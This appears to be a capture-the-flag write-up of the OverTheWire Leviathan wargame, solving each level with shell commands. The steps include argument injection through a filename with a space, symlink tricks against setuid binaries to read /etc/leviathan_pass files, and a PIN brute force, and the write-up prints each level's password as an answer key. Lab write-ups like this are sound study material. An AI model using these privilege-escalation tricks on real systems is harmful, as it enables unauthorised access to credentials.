# Leviathan
No instructions are given for any of the leviathan levels.

### lvl-0
There is a `.backup` folder in home with a `bookmarks.html` file inside.
```bash
$ grep pass .backup/bookmarks.html 
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```
rioGegei8m

### lvl-1
There is a binary (c program) in home called `check`. Running a hex-dump using
`xxd` reveals some hard coded strings:
```
000006e0: e073 6578 00c7 45d9 7365 6372 66c7 45dd  .sex..E.secrf.E.
000006f0: 6574 c645 df00 c745 d567 6f64 00c7 45d0  et.E...E.god..E.
00000700: 6c6f 7665 c645 d400 83ec 0c8d 8320 e8ff  love.E....... ..
```
Trying them as passwords through `check` gets us an `sh` shell with leviathan2
permissions:
```bash
$ ./check
password: sex

$ cat /etc/leviathan_pass/leviathan2
ougahZi8Ta
```

### lvl-2
There's a `printfile` binary in home. We need to find a vulnerability and
exploit it. (I looked this one up but it has shown me a good technique for
future ones!)
```bash
# ltrace shows the lib calls made by a binary
$ ltrace ./printfile /tmp/foo.txt

# touch a file then try to print it using the program
$ touch /tmp/foo.txt
$ ltrace ./printfile /tmp/foo.txt
__libc_start_main(0x565556c0, 2, 0xffffd724, 0x565557b0 <unfinished ...>
access("/tmp/foo.txt", 4)                                                                     = 0
snprintf("/bin/cat /tmp/foo.txt", 511, "/bin/cat %s", "/tmp/foo.txt")                         = 21
geteuid()                                                                                     = 12002
geteuid()                                                                                     = 12002
setreuid(12002, 12002)                                                                        = 0
system("/bin/cat /tmp/foo.txt" <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                        = 0
+++ exited (status 0) +++
```

```bash
# `access` checks that we have perms for the filename that we passed, but 
#  the call to `cat` doesn't shell escape so we can try a file with a
# space in it. `cat` should treat it as two files _after_ we have passed the
# permission check.
$ touch /tmp/foo\ bar.txt
$ ./printfile /tmp/foo\ bar.txt
/bin/cat: /tmp/foo: No such file or directory
/bin/cat: bar.txt: No such file or directory

# Now we just symlink /tmp/foo to /etc/leviathan_pass/leviathan3 and give it a go
$ ln -s /etc/leviathan_pass/leviathan3 /tmp/foo
$ ./printfile /tmp/foo\ bar.txt
Ahdiemoo1j
/bin/cat: bar.txt: No such file or directory
```

### lvl-3
This time there is a binary called `level3` in home. Running `ltrace` on it
shows that several hard-coded string comparisons are being done:
```bash
$ ltrace ./level3 
__libc_start_main(0x565557b4, 1, 0xffffd744, 0x56555870 <unfinished ...>
strcmp("h0no33", "kakaka")                                                                    = -1
printf("Enter the password> ")                                                                = 20
fgets(Enter the password> foo
"foo\n", 256, 0xf7fc55a0)                                                               = 0xffffd550
strcmp("foo\n", "snlprintf\n")                                                                = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                                                    = 19
+++ exited (status 0) +++
```

I'm not sure how to get at that first one but it looks like whatever we enter
as a password gets compared to `snlprintf`. Entering this gives us a shell:
```bash
$ ./level3 
Enter the password> snlprintf
[You\'ve got shell]!
$ whoami
leviathan4  # Looks like we have the correct perms to get the password!
$ cat /etc/leviathan_pass/leviathan4
qvuH0coox6m
```

So...that's the password but what is up with the `strcmp("h0no33", "kakaka")`
line? That always fails unless there is a way to change one of the strings...
-> Look into how to use gdb properly!
- It looks like none of the three strings (h0no33, kakaka or snlprintf) are in
  the binary itself...so where do they come from?

### lvl-4
Nothing visible in home but there is a hidden `.trash` folder with a `bin`
binary in it. Running it gives the following output:
```
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010 
```
Running under ltrace gives:
```bash
$ ltrace ./bin
__libc_start_main(0x56555640, 1, 0xffffd724, 0x56555750 <unfinished ...>
fopen("/etc/leviathan_pass/leviathan5", "r")                                                  = 0
+++ exited (status 255) +++
```

It's nothing exiting...it's just binary encoded ASCII...
```bash
$ ./data | /tmp/bintoascii.py  # File in this repo
Tith4cokei
```

### lvl-5
OK, this one looks more fun! There is a binary called `leviathan5` in home.
Running it gives the following output:
```bash
$ ./leviathan5
Cannot find /tmp/file.log
```
Creating the file with some contents gives us this:
```bash
$ echo "AB" >> /tmp/file.log
$ ltrace ./leviathan5 
__libc_start_main(0x56555760, 1, 0xffffd744, 0x56555840 <unfinished ...>
fopen("/tmp/file.log", ":r")                                                                   = 0x56558008
fgetc(0x56558008)                                                                             = 'A'
feof(0x56558008)                                                                              = 0
putchar(65, 0x565558c0, 1, 0x56555777)                                                        = 65
fgetc(0x56558008)                                                                             = 'B'
feof(0x56558008)                                                                              = 0
putchar(66, 0x565558c0, 1, 0x56555777)                                                        = 66
fgetc(0x56558008)                                                                             = '\n'
feof(0x56558008)                                                                              = 0
putchar(10, 0x565558c0, 1, 0x56555777AB
)                                                        = 10
fgetc(0x56558008)                                                                             = '\377'
feof(0x56558008)                                                                              = 1
fclose(0x56558008)                                                                            = 0
getuid()                                                                                      = 12005
setuid(12005)                                                                                 = 0
unlink("/tmp/file.log")                                                                       = 0
+++ exited (status 0) +++
```
Ah, I'm an idiot. Symlink trick again...so, any time a file cats out or shows a
hard-coded file name, symlink it to something you want to see! It looks like
`fopen` does correct permissions checks for the caller so this isn't a magic
bullet but it's worth a try.
```bash
$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
$ ./leviathan5 
UgaoFee4li
```

### lvl-6
Simple binary wanting a 4-digit pin. Brute force time!
```bash
leviathan6@leviathan:~$ python3
Python 3.5.3 (default, Jan 19 2017, 14:11:04) 
[GCC 6.3.0 20170118] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from itertools import permutations
>>> from subprocess import check_output
>>> 
>>> 
>>> # Generate all 4-digit codes
... four_digit_codes = permutations(range(10), 4)
>>> 
>>> for ix, code in enumerate(four_digit_codes):
...     str_code = ''.join(str(c) for c in code)
...     result = check_output(['/home/leviathan6/leviathan6', str_code])
...     if b'Wrong' not in result:
...         print(code)
...         print(result)
... 

/bin/sh: 1: Syntax error: "(" unexpected (expecting "then")
(7, 1, 2, 3)
b''
>>> 
>>> 
Error in atexit._run_exitfuncs:
PermissionError: [Errno 13] Permission denied

leviathan6@leviathan:~$ ./leviathan6 7123
$ cat /etc/leviathan_pass/leviathan7
ahy7MaeBo9
```

### lvl-7
This is just a congratulations file saying well done for finishing :)
